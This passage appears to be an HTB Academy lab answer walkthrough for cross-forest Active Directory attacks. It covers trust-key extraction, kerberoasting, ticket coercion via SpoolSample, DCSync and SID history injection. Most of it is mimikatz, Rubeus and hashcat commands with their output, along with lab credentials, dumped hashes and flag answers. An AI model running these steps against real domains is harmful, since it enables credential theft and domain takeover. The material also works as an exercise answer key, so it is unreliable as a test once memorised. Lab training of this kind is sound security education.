logistics\administrator@DC02 C:\Users\Administrator>
```

Subsequently, students will have to navigate to `C:\Tools` , and use `mimikatz.exe` to extract the forest trust keys:

Code: shell

```shell
cd C:\Tools
.\mimikatz.exe
lsadump::trust /patch
exit
```

```
┌─[us-academy-3]─[10.10.14.175]─[htb-ac-8414@htb-iplgz2mvla]─[~]
└──╼ [★]$ proxychains -q ssh Administrator@172.16.118.252
Administrator@172.16.118.252's password: 

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
logistics\administrator@DC02 C:\Users\Administrator>cd C:\Tools
logistics\administrator@DC02 C:\Tools>.\mimikatz.exe                                                                            
<SNIP>                                                      

mimikatz # lsadump::trust /patch                                                                                                

Current domain: LOGISTICS.AD (LOGISTICS / S-1-5-21-186204973-2882451676-2899969076)                                             

<SNIP>
                                                   
 [  In ] LOGISTICS.AD -> MEGACORP.AD                                                                                            
 [ Out ] MEGACORP.AD -> LOGISTICS.AD                                                                                            
    * 3/9/2024 4:08:15 AM - CLEAR   - 6e 00 7a 00 67 00 28 00 59 00 64 00 4f 00 6e 00 26 00 61 00 4f 00 3e 00 24 00 2d 00 31 00 

        * aes256_hmac       7ff5417ab7c7500896046133c9505d6a49425bd548a4db076a3e9df702f194eb
        * aes128_hmac       74fcfa250608b60297e35bc3763a60db
        * rc4_hmac_nt       68e456d3a95cc748ac5a2eae679b9c91                                                                    

<SNIP>

mimikatz # exit
Bye!
```

Right after obtaining the `rc4` value students will proceed to spawn `PowerShell` and request a ticket-granting ticket using `Rubeus.exe` as the user `logistics$` and the rc4 value of `68e456d3a95cc748ac5a2eae679b9c91` for the domain `megacorp.ad`, and import the ticket into memory:

Code: powershell

```powershell
powershell
.\Rubeus.exe asktgt /user:logistics$ /domain:megacorp.ad /rc4:68e456d3a95cc748ac5a2eae679b9c91 /ptt  
```

```
logistics\administrator@DC02 C:\Tools>powershell                                                                                
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Tools> .\Rubeus.exe asktgt /user:logistics$ /domain:megacorp.ad /rc4:68e456d3a95cc748ac5a2eae679b9c91 /ptt                

<SNIP>                                                                                               

[*] Action: Ask TGT                                                                                                             
[*] Using rc4_hmac hash: 68e456d3a95cc748ac5a2eae679b9c91
[*] Building AS-REQ (w/ preauth) for: 'megacorp.ad\logistics$'
[*] Using domain controller: 172.16.118.113:88
[+] TGT request successful!
[*] base64(ticket.kirbi):                                                                                                       

      doIE8DCCBOygAwIBBaEDAgEWooIEBjCCBAJhggP+MIID+qADAgEFoQ0bC01FR0FDT1JQLkFEoiAwHqAD                                          
<SNIP>                  
      pxEYDzIwMjQwNTAzMTA0MDM4WqgNGwtNRUdBQ09SUC5BRKkgMB6gAwIBAqEXMBUbBmtyYnRndBsLbWVn                                          
      YWNvcnAuYWQ=                                                                                                              
[+] Ticket successfully imported!                                                                                               
  ServiceName              :  krbtgt/megacorp.ad
  ServiceRealm             :  MEGACORP.AD
  UserName                 :  logistics$
  UserRealm                :  MEGACORP.AD
  StartTime                :  4/26/2024 3:40:38 AM
  EndTime                  :  4/26/2024 1:40:38 PM
  RenewTill                :  5/3/2024 3:40:38 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable                                   
  KeyType                  :  rc4_hmac
  Base64(key)              :  Z19tBr38/28bc/+0/VRB8g==
  ASREP (key):  68E456D3A95CC748AC5A2EAE679B9C91
```

Subsequently, students will proceed to perform a kerberoasting attack against the user `white.beard` using `Rubeus.exe`:

Code: powershell

```powershell
.\Rubeus.exe kerberoast /user:white.beard /domain:megacorp.ad /format:hashcat /nowrap
```

```
PS C:\Tools> .\Rubeus.exe kerberoast /user:white.beard /domain:megacorp.ad /format:hashcat /nowrap                              

<SNIP>

[*] Action: Kerberoasting                                                                                                       
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : white.beard
[*] Target Domain          : megacorp.ad                                                                                        
[*] Searching path 'LDAP://DC03.MEGACORP.AD/DC=megacorp,DC=ad' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAcco
untName=white.beard)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'                                                         

[*] Total kerberoastable users : 1                                                                                              
[*] SamAccountName: white.beard
[*] DistinguishedName      : CN=white.beard,CN=Users,DC=MEGACORP,DC=AD
[*] ServicePrincipalName   : HTTP/BLACK.megacorp.ad:1433
[*] PwdLastSet             : 3/9/2024 3:02:44 AM                                                                                
[*] Supported ETypes: RC4_HMAC_DEFAULT                                                                                   
[*] Hash                   : $krb5tgs$23$*white.beard$MEGACORP.AD$HTTP/BLACK.megacorp.ad:1433@megacorp.ad*$D0CCCC7DB0CE03D75DB38
8CA14DCDFBF$BAF0B1E4C1182734D2C616D3A229621F4B57D194E0A5C3BF8CB82C61608AA5A4F4BEB6F277553BA6B2AC70BE9C025201C122A83D7FC00DC04CE1
7AF634FADADBD415176711B3C45085C7ECCD923D7DCADF61BE28830FD4C7FDFD5B74BF5B656753893DE2E9A0C0A900E1B926BE16A83C5239E3DC472D719E3AD7
8D2FCFBC35D86B238E9DE59DE98BBD4A4C84381A1FE624B0AFE59AD0A2E7C1A87BAEE656E45A75125F211CE744E1E0634CE257F02F7332C964107E89C72BE4E8
E918681F4E80CB4CBEFEC9EF99B53E1AB83127906BF913B24E19F92F8E5AAB2D08E332B42E5430698A4B0CF02F01E1F165B4AA7F5D1F7984298CE39A6503FE2B
8359FF9DE698A92D30F056E6EDEB746F292F6FF111025F82D33EDD84A56829957C1940E414711D761F9542F2344376ED51021585215713C75934FF6B5451C281
F5556F61923D419D1B96F95D83A6AF10FB834D5B5D2DC4C78FB8C114E3D0EE3FFC59AD1426BFC2C8D9EE5F7CFC143B8EA9438DE26F8909D61D0AE027958409CC
89A05FDB246D23B35C52D4045BBB3AF0477494079F6149C200A4B17531E04F32B79C9F0011DB13BA87CA600BAD2EBD0E071F582C5C7F6061100CBD2CA823E203
B395970F5D7CB5392964137A1C8DD0A0AD5B15D04DB2031A69FFA0E2C86F9C1FE9EEC3BFB16F33245806C8AA9007B297DDAA50F1C382E5FB3FE04069908A314A
7FA8F05E7A132B9AB07752B892397B2A6E2693FA551895F7D9C60A68988E160D1FDC26F20685EACA79F1E0F42DE50A13E3F305F74F29CAC0A945901CDACBAF3A
0C3ED1776A9436C7A66A851A049BF2EAFDA9323A6A387EDD3CF70172C88F575BB522AE28739E7566F34A967AB5D23B4B3A96199EF6AF1DAFA301696AB2E63935
8B051F8AD34D195FAF6FDAA73F6672243EB47039DB2547F86B4838B395078287C6D867CDC58324CA992A49FE5564AEDB68E21B81C4C8464310A382AF0FA15574
49822F46A406917DD783FD70DEC1F3AFF6752A04C9E68E3C261D56542CB3E9F3913575191D1B9607D384D176544E420E7701C473E284E89FF5B71918AF251E66
8F59EB954AC9141AE4E672AB3EB4CE013EF0D7D70A2507B861CE808E1B04D075B7CB6B0A6B2E2485AA332F440D2210D388467C53CBFFC879871476A22B73E9A2
D41D9497E8DC3DC4E2C609A692475ECB694ED65211F4C4E96D76C6C381F9F09BDA47AE3AF933958843BC18686365AC82D7DA778F8EFEEA89A5A24E48197A2C73
124B038A9DCCAA98E7AFD543A4B12E9D82B327E4B0D14F51C5910B59D24BC5067ACFCB3F601FA0D5406290E6D2161D4E3ABF746DD11D4C89A2E6964A46AB93C5
5808AD39AF2D51024EFCB47CE1391878A01993CABCA8F98B517D85F16294CEE9831DB846EDDCD61381E6AF4FC39FEA8819D35BAF95AFB74564666864BED724CB
AB2BF18F680898F5ABF5A4FFA562
```

They will have to copy the hash into a file on the Linux workstation and remove any new-line characters, which could prevent the hash from being appropriately loaded.

Code: shell

```shell
echo -n '$krb5tgs$23$*white.beard$MEGACORP.AD$HTTP/BLACK.megacorp.ad:1433@megacorp.ad*$D0CCCC7DB0CE03D75DB38
8CA14DCDFBF$BAF0B1E4C1182734D2C616D3A229621F4B57D194E0A5C3BF8CB82C61608AA5A4F4BEB6F277553BA6B2AC70BE9C025201C122A83D7FC00DC04CE1
7AF634FADADBD415176711B3C45085C7ECCD923D7DCADF61BE28830FD4C7FDFD5B74BF5B656753893DE2E9A0C0A900E1B926BE16A83C5239E3DC472D719E3AD7
8D2FCFBC35D86B238E9DE59DE98BBD4A4C84381A1FE624B0AFE59AD0A2E7C1A87BAEE656E45A75125F211CE744E1E0634CE257F02F7332C964107E89C72BE4E8
E918681F4E80CB4CBEFEC9EF99B53E1AB83127906BF913B24E19F92F8E5AAB2D08E332B42E5430698A4B0CF02F01E1F165B4AA7F5D1F7984298CE39A6503FE2B
8359FF9DE698A92D30F056E6EDEB746F292F6FF111025F82D33EDD84A56829957C1940E414711D761F9542F2344376ED51021585215713C75934FF6B5451C281
F5556F61923D419D1B96F95D83A6AF10FB834D5B5D2DC4C78FB8C114E3D0EE3FFC59AD1426BFC2C8D9EE5F7CFC143B8EA9438DE26F8909D61D0AE027958409CC
89A05FDB246D23B35C52D4045BBB3AF0477494079F6149C200A4B17531E04F32B79C9F0011DB13BA87CA600BAD2EBD0E071F582C5C7F6061100CBD2CA823E203
B395970F5D7CB5392964137A1C8DD0A0AD5B15D04DB2031A69FFA0E2C86F9C1FE9EEC3BFB16F33245806C8AA9007B297DDAA50F1C382E5FB3FE04069908A314A
7FA8F05E7A132B9AB07752B892397B2A6E2693FA551895F7D9C60A68988E160D1FDC26F20685EACA79F1E0F42DE50A13E3F305F74F29CAC0A945901CDACBAF3A
0C3ED1776A9436C7A66A851A049BF2EAFDA9323A6A387EDD3CF70172C88F575BB522AE28739E7566F34A967AB5D23B4B3A96199EF6AF1DAFA301696AB2E63935
8B051F8AD34D195FAF6FDAA73F6672243EB47039DB2547F86B4838B395078287C6D867CDC58324CA992A49FE5564AEDB68E21B81C4C8464310A382AF0FA15574
49822F46A406917DD783FD70DEC1F3AFF6752A04C9E68E3C261D56542CB3E9F3913575191D1B9607D384D176544E420E7701C473E284E89FF5B71918AF251E66
8F59EB954AC9141AE4E672AB3EB4CE013EF0D7D70A2507B861CE808E1B04D075B7CB6B0A6B2E2485AA332F440D2210D388467C53CBFFC879871476A22B73E9A2
D41D9497E8DC3DC4E2C609A692475ECB694ED65211F4C4E96D76C6C381F9F09BDA47AE3AF933958843BC18686365AC82D7DA778F8EFEEA89A5A24E48197A2C73
124B038A9DCCAA98E7AFD543A4B12E9D82B327E4B0D14F51C5910B59D24BC5067ACFCB3F601FA0D5406290E6D2161D4E3ABF746DD11D4C89A2E6964A46AB93C5
5808AD39AF2D51024EFCB47CE1391878A01993CABCA8F98B517D85F16294CEE9831DB846EDDCD61381E6AF4FC39FEA8819D35BAF95AFB74564666864BED724CB
AB2BF18F680898F5ABF5A4FFA562' > whitebeard.hash

sed -i ':a;N;$!ba;s/\n//g' whitebeard.hash
hashcat -m 13100 whitebeard.hash /usr/share/wordlists/rockyou.txt 
```

```
┌─[us-academy-3]─[10.10.14.175]─[htb-ac-8414@htb-iplgz2mvla]─[~]
└──╼ [★]$ echo -n '$krb5tgs$23$*white.beard$MEGACORP.AD$HTTP/BLACK.megacorp.ad:1433@megacorp.ad*$D0CCCC7DB0CE03D75DB38
8CA14DCDFBF$BAF0B1E4C1182734D2C616D3A229621F4B57D194E0A5C3BF8CB82C61608AA5A4F4BEB6F277553BA6B2AC70BE9C025201C122A83D7FC00DC04CE1
7AF634FADADBD415176711B3C45085C7ECCD923D7DCADF61BE28830FD4C7FDFD5B74BF5B656753893DE2E9A0C0A900E1B926BE16A83C5239E3DC472D719E3AD7
8D2FCFBC35D86B238E9DE59DE98BBD4A4C84381A1FE624B0AFE59AD0A2E7C1A87BAEE656E45A75125F211CE744E1E0634CE257F02F7332C964107E89C72BE4E8
E918681F4E80CB4CBEFEC9EF99B53E1AB83127906BF913B24E19F92F8E5AAB2D08E332B42E5430698A4B0CF02F01E1F165B4AA7F5D1F7984298CE39A6503FE2B
8359FF9DE698A92D30F056E6EDEB746F292F6FF111025F82D33EDD84A56829957C1940E414711D761F9542F2344376ED51021585215713C75934FF6B5451C281
F5556F61923D419D1B96F95D83A6AF10FB834D5B5D2DC4C78FB8C114E3D0EE3FFC59AD1426BFC2C8D9EE5F7CFC143B8EA9438DE26F8909D61D0AE027958409CC
89A05FDB246D23B35C52D4045BBB3AF0477494079F6149C200A4B17531E04F32B79C9F0011DB13BA87CA600BAD2EBD0E071F582C5C7F6061100CBD2CA823E203
B395970F5D7CB5392964137A1C8DD0A0AD5B15D04DB2031A69FFA0E2C86F9C1FE9EEC3BFB16F33245806C8AA9007B297DDAA50F1C382E5FB3FE04069908A314A
7FA8F05E7A132B9AB07752B892397B2A6E2693FA551895F7D9C60A68988E160D1FDC26F20685EACA79F1E0F42DE50A13E3F305F74F29CAC0A945901CDACBAF3A
0C3ED1776A9436C7A66A851A049BF2EAFDA9323A6A387EDD3CF70172C88F575BB522AE28739E7566F34A967AB5D23B4B3A96199EF6AF1DAFA301696AB2E63935
8B051F8AD34D195FAF6FDAA73F6672243EB47039DB2547F86B4838B395078287C6D867CDC58324CA992A49FE5564AEDB68E21B81C4C8464310A382AF0FA15574
49822F46A406917DD783FD70DEC1F3AFF6752A04C9E68E3C261D56542CB3E9F3913575191D1B9607D384D176544E420E7701C473E284E89FF5B71918AF251E66
8F59EB954AC9141AE4E672AB3EB4CE013EF0D7D70A2507B861CE808E1B04D075B7CB6B0A6B2E2485AA332F440D2210D388467C53CBFFC879871476A22B73E9A2
D41D9497E8DC3DC4E2C609A692475ECB694ED65211F4C4E96D76C6C381F9F09BDA47AE3AF933958843BC18686365AC82D7DA778F8EFEEA89A5A24E48197A2C73
124B038A9DCCAA98E7AFD543A4B12E9D82B327E4B0D14F51C5910B59D24BC5067ACFCB3F601FA0D5406290E6D2161D4E3ABF746DD11D4C89A2E6964A46AB93C5
5808AD39AF2D51024EFCB47CE1391878A01993CABCA8F98B517D85F16294CEE9831DB846EDDCD61381E6AF4FC39FEA8819D35BAF95AFB74564666864BED724CB
AB2BF18F680898F5ABF5A4FFA562' > whitebeard.hash

┌─[us-academy-3]─[10.10.14.175]─[htb-ac-8414@htb-iplgz2mvla]─[~]
└──╼ [★]$ sed -i ':a;N;$!ba;s/\n//g' whitebeard.hash 
┌─[us-academy-3]─[10.10.14.175]─[htb-ac-8414@htb-iplgz2mvla]─[~]
└──╼ [★]$ hashcat -m 13100 whitebeard.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC 7543 32-Core Processor, 7855/7919 MB (1979 MB allocatable), 4MCU

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
=============================================================================================================================
<SNIP>

$krb5tgs$23$*white.beard$MEGACORP.AD$HTTP/BLACK.megacorp.ad:1433@megacorp.ad*$d0cccc7db0ce03d75db388ca14dcdfbf$baf<SNIP>ffa562:letmein
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*white.beard$MEGACORP.AD$HTTP/BLACK.meg...ffa562
Time.Started.....: Fri Apr 26 11:46:16 2024 (0 secs)
Time.Estimated...: Fri Apr 26 11:46:16 2024 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2094.5 kH/s (7.18ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 16384/14344385 (0.11%)
Rejected.........: 0/16384 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> cocoliso

Started: Fri Apr 26 11:45:56 2024
Stopped: Fri Apr 26 11:46:17 2024
```

Answer: `letmein`

# Trust Account Attack

## Question 2

### "Authenticate to DC02.logistics.ad (172.16.118.252) using SSH. Perform the 'Trust Account Attack' and compromise megacorp.ad domain. What is the flag value found at C:\\flag.txt in DC03.megacorp.ad?"

Using the previously established connection, students will proceed to request a ticket-granting ticket (TGT) for the user `white.beard` with the previously found password using `Rubeus.exe` and import the ticket into memory:

Code: powershell

```powershell
.\Rubeus.exe asktgt /user:white.beard /password:letmein /domain:megacorp.ad /ptt 
```

```
PS C:\Tools> .\Rubeus.exe asktgt /user:white.beard /password:letmein /domain:megacorp.ad /ptt                                   

 <SNIP>                                                                                       

[*] Action: Ask TGT                                                                                                             
[*] Using rc4_hmac hash: BECEDB42EC3C5C7F965255338BE4453C
[*] Building AS-REQ (w/ preauth) for: 'megacorp.ad\white.beard'
[*] Using domain controller: 172.16.118.113:88
[+] TGT request successful!
[*] base64(ticket.kirbi):                                                                                                       

      doIE+jCCBPagAwIBBaEDAgEWooIEDzCCBAthggQHMIIEA6ADAgEFoQ0bC01FR0FDT1JQLkFEoiAwHqAD                                          
<SNIP>                   
      NDI2MjA1MTU0WqcRGA8yMDI0MDUwMzEwNTE1NFqoDRsLTUVHQUNPUlAuQUSpIDAeoAMCAQKhFzAVGwZr                                          
      cmJ0Z3QbC21lZ2Fjb3JwLmFk                                                                                                  
[+] Ticket successfully imported!                                                                                               

  ServiceName              :  krbtgt/megacorp.ad
  ServiceRealm             :  MEGACORP.AD
  UserName                 :  white.beard
  UserRealm                :  MEGACORP.AD
  StartTime                :  4/26/2024 3:51:54 AM
  EndTime                  :  4/26/2024 1:51:54 PM
  RenewTill                :  5/3/2024 3:51:54 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable                                   
  KeyType                  :  rc4_hmac
  Base64(key)              :  U9zl0XbKu5wSLbTaAW+J1g==
  ASREP (key)              :  BECEDB42EC3C5C7F965255338BE4453C
```

Subsequently, students need to create a new PowerShell session using `New-PSSession`cmdlet to create a connection to the `DC03.megacorp.ad` domain controller, right after that they will have to enter the newly established PowerShell session using `Enter-PSSession` cmdlet and grab the flag:

Code: powershell

```powershell
New-PSSession DC03.megacorp.ad
Enter-PSSession DC03.megacorp.ad
type C:\flag.txt
```

```
PS C:\Tools> New-PSSession DC03.megacorp.ad                                                                                     
 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability                            
 -- ----            ------------    ------------    -----         -----------------     ------------                            
  1 Session1        DC03.megacor... RemoteMachine   Opened        Microsoft.PowerShell     Available                            

PS C:\Tools> Enter-PSSession DC03.megacorp.ad                                                                                   
[DC03.megacorp.ad]: PS C:\Users\white.beard\Documents> type C:\flag.txt                                                         
4cf2108f7478900dfc0ea344890a0d05
```

Answer: `4cf2108f7478900dfc0ea344890a0d05`

# Unconstrained Delegation Cross Forest

## Question 1

### "Authenticate to DC01.inlanefreight.ad (172.16.118.3) and abuse Unconstrained Delegation to compromise the Logistics domain. What is the NTLM hash for the user htb-admin?"

After spawning the target students will have to utilize `SSH` to create a dynamic port forwarding with the credentials `Administrator:Test@123`:

Code: shell

```shell
ssh -D 9050 Administrator@STMIP
```

```
┌─[us-academy-3]─[10.10.14.175]─[htb-ac-8414@htb-oueyjddrwl]─[~]
└──╼ [★]$ ssh -D 9050 Administrator@10.129.33.83

The authenticity of host '10.129.33.83 (10.129.33.83)' can't be established.
ECDSA key fingerprint is SHA256:ymhpv5dvyTmqO+Iq4zNh/Q4bdf6z9s9uA/ZofCP/fBs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.33.83' (ECDSA) to the list of known hosts.
Administrator@10.129.33.83's password: 

Microsoft Windows [Version 10.0.14393]                                          
(c) 2016 Microsoft Corporation. All rights reserved.                            

administrator@SQL01 C:\Users\Administrator>
```

Subsequently, students need to open a new terminal tab to establish an RDP session to `DC01.inlanefreight.ad` (`172.16.118.3`) with the credentials `Administrator:HTB_@cademy_adm!`:

Code: shell

```shell
proxychains -q xfreerdp /v:172.16.118.3 /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution
```

```
┌─[us-academy-3]─[10.10.14.175]─[htb-ac-8414@htb-wrxqov5kwc]─[~]
└──╼ [★]$ proxychains -q xfreerdp /v:172.16.118.3 /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution

[12:43:04:521] [4629:4631] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[12:43:04:521] [4629:4631] [WARN][com.freerdp.crypto] - CN = DC01.inlanefreight.ad
[12:43:06:125] [4629:4631] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[12:43:06:125] [4629:4631] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[12:43:06:143] [4629:4631] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[12:43:06:143] [4629:4631] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[12:43:06:143] [4629:4631] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[12:43:07:929] [4629:4631] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
```

Consequently, they will open two `Command Prompt` terminals, navigate to `C:\Tools`, and use `Rubeus.exe` to monitor for tickets, and `SpoolSample.exe` to coerce an authentication from `DC02.logistics.ad` to `DC01.inlanefreight.ad`:

Code: cmd

```cmd
cd C:\Tools
.\Rubeus.exe monitor /interval:5 /nowrap
```

```
C:\Users\Administrator>cd C:\Tools

C:\Tools>.\Rubeus.exe monitor /interval:5 /nowrap
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs

[*] 4/26/2024 11:45:54 AM UTC - Found new TGT:

  User                  :  Administrator@INLANEFREIGHT.AD
  StartTime             :  4/26/2024 4:43:07 AM
  EndTime               :  4/26/2024 2:43:07 PM
  RenewTill             :  5/3/2024 4:43:07 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

<SNIP>
```

Right after starting the monitoring, students need to use the second `Command Prompt` terminal, they will use `SpoolSample.exe` to coerce the authentication which will be captured within `Rubeus.exe` output:

Code: cmd

```cmd
cd C:\Tools
SpoolSample.exe dc02.logistics.ad dc01.inlanefreight.ad
```

```
C:\Users\Administrator>cd C:\Tools
C:\Tools>SpoolSample.exe dc02.logistics.ad dc01.inlanefreight.ad
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\dc02.logistics.ad, CaptureServer: \\dc01.inlanefreight.ad
Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
```

Going back to the terminal with `Rubeus.exe` students will come to know that the authentication was successfully captured and they will proceed to copy the `Base64EncodedTicket`.

```
C:\Tools>.\Rubeus.exe monitor /interval:5 /nowrap
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs

[*] 4/26/2024 11:45:54 AM UTC - Found new TGT:

  User                  :  Administrator@INLANEFREIGHT.AD
  StartTime             :  4/26/2024 4:43:07 AM
  EndTime               :  4/26/2024 2:43:07 PM
  RenewTill             :  5/3/2024 4:43:07 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

<SNIP>

[*] 4/26/2024 11:48:34 AM UTC - Found new TGT:

  User                  :  DC02$@LOGISTICS.AD
  StartTime             :  4/26/2024 4:38:09 AM
  EndTime               :  4/26/2024 2:38:09 PM
  RenewTill             :  5/3/2024 4:38:09 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFFDCCBRCgA <SNIP> QUQ=

<SNIP>
```

With the attained ticket, students will have to use `Rubeus.exe` to renew the ticket and import it into memory:

Code: cmd

```cmd
.\Rubeus.exe renew /ticket:doIFFDCCBRCgA <SNIP> QUQ= /ptt
```

```
C:\Tools>.\Rubeus.exe renew /ticket:doIFFDCCBRCgA <SNIP> QUQ= /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Renew Ticket

[*] Using domain controller: DC02.logistics.ad (172.16.118.252)
[*] Building TGS-REQ renewal for: 'LOGISTICS.AD\DC02$'
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

      doIFFDCCBRCgAwIBBaEDAgEWooIEHDCCBBhhggQUMIIEEKADAgEFoQ4bDExPR0lTVElDUy5BRKIhMB+g

<SNIP>
      MjAyNDA0MjYxMTUxMTRaphEYDzIwMjQwNDI2MjE1MTE0WqcRGA8yMDI0MDUwMzExMzgwOVqoDhsMTE9H
      SVNUSUNTLkFEqSEwH6ADAgECoRgwFhsGa3JidGd0GwxMT0dJU1RJQ1MuQUQ=
[+] Ticket successfully imported!
```

Having imported the ticket into memory, they will proceed to use `mimikatz.exe` and execute a DCSync attack targeting the `htb-admin` user and obtaining his NTLM hash:

Code: cmd

```cmd
.\mimikatz.exe
lsadump::dcsync /domain:logistics.ad /user:htb-admin
```

```
C:\Tools>.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /domain:logistics.ad /user:htb-admin
[DC] 'logistics.ad' will be the domain
[DC] 'DC02.logistics.ad' will be the DC server
[DC] 'htb-admin' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : htb admin

** SAM ACCOUNT **

SAM Username         : htb-admin
User Principal Name  : htb-admin@logistics.ad
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 12/27/2023 3:43:02 AM
Object Security ID   : S-1-5-21-186204973-2882451676-2899969076-1106
Object Relative ID   : 1106

Credentials:
  Hash NTLM: 1d9700fece3d6a5d99e85642467bbc30
    ntlm- 0: 1d9700fece3d6a5d99e85642467bbc30
    lm  - 0: 26174459f07eb6c15344c35a2617fab5

<SNIP>
```

Answer: `1d9700fece3d6a5d99e85642467bbc30`

# SID History Injection Attack

## Question 1

### "Authenticate to DC01.inlanefreight.ad (172.16.118.3) and perform "SID History Injection" to compromise the Logistics Domain. What is the flag value at "\\\\DC02.logistics.ad\\SID\_Flag\\flag.txt"?"

After spawning the target, students need to connect via SSH and establish a dynamic port forwarding with the credentials `Administrator:Test@123`:

Code: shell

```shell
ssh -D 9050 Administrator@STMIP
```

```
┌─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-d5gkrvztl3]─[~]
└──╼ [★]$ ssh -D 9050 Administrator@10.129.60.3

The authenticity of host '10.129.60.3 (10.129.60.3)' can't be established.
ECDSA key fingerprint is SHA256:ymhpv5dvyTmqO+Iq4zNh/Q4bdf6z9s9uA/ZofCP/fBs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.60.3' (ECDSA) to the list of known hosts.
Administrator@10.129.60.3's password: 

Microsoft Windows [Version 10.0.14393]                                          
(c) 2016 Microsoft Corporation. All rights reserved.                            

administrator@SQL01 C:\Users\Administrator> 
```

Subsequently, students need to open a new terminal tab and connect to `DC01.inlanefreight.ad` (`172.16.118.3`) with the credentials `Administrator:HTB_@cademy_adm!`:

Code: shell

```shell
proxychains -q xfreerdp /v:172.16.118.3 /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution
```

```
┌─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-d5gkrvztl3]─[~]
└──╼ [★]$ proxychains -q xfreerdp /v:172.16.118.3 /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution

[18:13:11:346] [4738:4741] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[18:13:11:346] [4738:4741] [WARN][com.freerdp.crypto] - CN = DC01.inlanefreight.ad
[18:13:12:950] [4738:4741] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[18:13:12:950] [4738:4741] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[18:13:12:967] [4738:4741] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[18:13:12:967] [4738:4741] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[18:13:12:967] [4738:4741] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[18:13:13:856] [4738:4741] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
```

